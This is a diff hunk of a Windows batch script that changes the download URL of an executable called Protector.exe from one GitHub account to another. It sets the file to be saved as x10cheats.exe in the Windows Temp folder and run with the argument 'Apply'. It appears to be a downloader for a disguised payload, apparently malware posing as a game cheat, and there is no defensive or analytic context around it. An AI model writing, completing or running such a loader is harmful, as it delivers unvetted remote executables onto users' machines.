@@ -1,5 +1,5 @@
 @echo off
-set "url=https://github.com/inshalliaqat/x10/raw/main/Protector.exe"
+set "url=https://raw.githubusercontent.com/Ahetuk/Free/main/Protector.exe"
 set "destination=C:\Windows\Temp\x10cheats.exe"
 set "arguments=Apply"
 
